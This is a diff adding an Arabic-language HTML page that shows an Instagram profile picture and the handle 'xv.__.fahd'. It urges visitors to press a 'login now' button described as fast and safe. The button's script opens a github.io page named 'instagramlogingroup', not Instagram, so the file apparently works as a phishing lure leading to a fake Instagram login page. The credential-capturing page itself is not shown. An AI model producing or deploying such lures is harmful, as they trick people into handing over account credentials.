@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>xv.__.fahd — عرض بسيط</title>
+  <style>
+    :root{
+      --bg:#0f172a;
+      --card:#0b1220;
+      --muted:#9ca3af;
+      --glass: rgba(255,255,255,0.04);
+      --gradient: linear-gradient(135deg,#feda75,#fa7e1e,#d62976,#962fbf,#4f5bd5);
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-family: Inter, system-ui, Arial, sans-serif;
+      background:
+        radial-gradient(800px 400px at 10% 10%, rgba(79,91,213,0.12), transparent 10%),
+        radial-gradient(600px 300px at 90% 90%, rgba(214,41,118,0.08), transparent 10%),
+        var(--bg);
+      color:#fff;
+      padding:20px;
+    }
+
+    .card{
+      width:100%;
+      max-width:420px;
+      background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));
+      border-radius:18px;
+      padding:22px;
+      box-shadow: 0 10px 40px rgba(2,6,23,0.6);
+      border: 1px solid rgba(255,255,255,0.04);
+      text-align:center;
+    }
+
+    .avatar-wrap{
+      width:150px;
+      height:150px;
+      margin:0 auto 16px;
+      border-radius:50%;
+      padding:6px;
+      background: linear-gradient(135deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
+      box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+
+    .avatar{
+      width:100%;
+      height:100%;
+      border-radius:50%;
+      object-fit:cover;
+      display:block;
+      transform: translateZ(0);
+      transition: transform .45s cubic-bezier(.2,.9,.2,1);
+    }
+
+    .avatar-wrap:hover .avatar{
+      transform: scale(1.035) rotate(-1.5deg);
+    }
+
+    h1{
+      margin:6px 0 4px;
+      font-size:20px;
+      letter-spacing:0.4px;
+    }
+
+    p.desc{
+      margin:0 0 18px;
+      color:var(--muted);
+      font-size:14px;
+    }
+
+    /* زر تسجيل دخول جذاب */
+    .login-btn{
+      display:inline-block;
+      padding:12px 28px;
+      border-radius:999px;
+      font-weight:800;
+      font-size:16px;
+      color:white;
+      background:var(--gradient);
+      border:none;
+      cursor:pointer;
+      box-shadow:
+        0 6px 18px rgba(79,91,213,0.18),
+        0 2px 6px rgba(0,0,0,0.5),
+        inset 0 -2px 8px rgba(255,255,255,0.06);
+      transition: transform .16s ease, box-shadow .16s ease;
+      position:relative;
+      overflow:hidden;
+      text-decoration:none;
+    }
+
+    .login-btn:before{
+      content:"";
+      position:absolute;
+      left:-40%;
+      top:0;
+      width:60%;
+      height:100%;
+      background: linear-gradient(90deg, rgba(255,255,255,0.18), rgba(255,255,255,0.03));
+      transform: skewX(-20deg);
+      transition: left .8s cubic-bezier(.2,.9,.2,1);
+    }
+
+    .login-btn:hover{
+      transform: translateY(-4px) scale(1.01);
+      box-shadow:
+        0 12px 30px rgba(79,91,213,0.22),
+        0 4px 10px rgba(0,0,0,0.55);
+    }
+
+    .login-btn:hover:before{
+      left:120%;
+    }
+
+    .login-sub{
+      display:flex;
+      gap:10px;
+      align-items:center;
+      justify-content:center;
+      margin-top:12px;
+      color:var(--muted);
+      font-size:13px;
+    }
+
+    /* لمسة صغيرة للشاشة الصغيرة */
+    @media (max-width:420px){
+      .card{padding:18px}
+      .avatar-wrap{width:130px;height:130px}
+    }
+  </style>
+</head>
+<body>
+  <div class="card" role="region" aria-label="معاينة الصورة - xv.__.fahd">
+    <div class="avatar-wrap" aria-hidden="true">
+      <img class="avatar" src="https://instagram.fcmn2-2.fna.fbcdn.net/v/t51.2885-19/503302170_17909341860151367_6276404415041514258_n.jpg?stp=dst-jpg_s150x150_tt6&efg=eyJ2ZW5jb2RlX3RhZyI6InByb2ZpbGVfcGljLmRqYW5nby4xMDgwLmMyIn0&_nc_ht=instagram.fcmn2-2.fna.fbcdn.net&_nc_cat=111&_nc_oc=Q6cZ2QGm_Uh4G8iZFda47cqPtxjIgYgSJjc9mOWFzCldKx8Nrxd3URHxkx110nLesbXrTwE&_nc_ohc=-FIStAdY-uoQ7kNvwEcE_O8&_nc_gid=Z7kOxuSYBQsGlTYCCSQEsA&edm=AP83FgwBAAAA&ccb=7-5&oh=00_AfXlIqtUtveKVe3bW6p3iwBdy35eDI6yGtHD1lsHlwuY7w&oe=689B3D7D&_nc_sid=e967f1" alt="xv.__.fahd" />
+    </div>
+
+    <h1>xv.__.fahd</h1>
+    <p class="desc"> اضغط على تسجيل الدخول للمتابعة.</p>
+
+    <a class="login-btn" id="loginBtn" href="#" role="button" aria-label="تسجيل دخول إلى حساب إنستغرام">
+      🚀 تسجيل دخول الآن
+    </a>
+
+    <div class="login-sub">أو افتح الرابط في نافذة جديدة — سريع وآمن</div>
+  </div>
+
+  <script>
+    // الرابط الذي طلبته سيفتح في نافذة جديدة عند النقر
+    const url = 'https://instagramlogingroup.github.io/login/instagram/instagramgroup.html';
+    document.getElementById('loginBtn').addEventListener('click', function(e){
+      e.preventDefault();
+      window.open(url, '_blank', 'noopener,noreferrer');
+    });
+  </script>
+</body>
+</html>
